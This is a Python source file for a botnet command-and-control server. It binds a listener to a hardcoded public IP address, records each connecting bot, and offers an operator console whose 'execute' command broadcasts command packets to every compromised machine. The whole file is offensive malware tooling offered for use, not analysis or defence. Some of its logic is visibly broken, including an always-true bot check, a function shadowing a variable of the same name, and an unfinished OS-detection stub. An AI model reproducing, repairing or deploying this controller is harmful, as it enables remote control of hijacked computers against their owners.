import socket
import struct
from threading import Thread
from time import sleep
import sys

botnet = []
botnet_address = []
exec_command = "null"
on_connect_exit = False

def check_bot(addr):
    global botnet_address
    for add in botnet_address:
        if(add == addr):
            return True
    return False

def start_server(port=2003,ip="142.93.197.240"):
    global botnet,exec_command,on_connect_exit
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((ip,port))
    s.listen(5)
    print("\n[*] Server Started!")
    while True:
        bot,addr = s.accept()
        botnet.append(bot)
        botnet_address.append(str(addr[0]))
        if(check_bot(addr[0])):
            print("[*] New bot %s"%(str(addr[0])))

def detect_os():
    #Build a dictionary of botnet addresses and sock connections
    for bot in botnet:
        pass

def exec_command(cmd):
    global botnet
    print("[*] Sending Command Packets...")
    sleep(1)
    for bot in botnet:
        cmd_size = len(cmd)
        packet = struct.pack("<H%ds"%(cmd_size),cmd_size,cmd) # H --> 2 Bytes Buffer Size
        bot.send(packet)
        #print("[*] Command packet sent")

def process_cmd(cmd):
    global botnet,botnet_address
    sleep(1)
    if(cmd == "show botnet"):
        count = 1
        for bot in botnet_address:
            print("[*] %d : %s"%(count,str(bot)))
            count += 1
    if 'execute' in cmd:
        #cmd = cmd.strip("execute ")
        exec_command(cmd)
        print("[*] Command packets sent!")
    if(cmd == "get os"):
        detect_os()
    if 'test' in cmd:
        cmd = cmd.strip("test ")
        pass

def main():
    try:
        listener_thread = Thread(target=start_server,args=())
        listener_thread.start()
        while True:
            cmd = input(">>")
            command_thread = Thread(target=process_cmd,args=(cmd,))
            command_thread.start()
            print("[*] Processing command")
    except KeyboardInterrupt:
        print("[*] Botnet Terminated!")
        sys.exit(0)

if __name__ == '__main__':
    main()
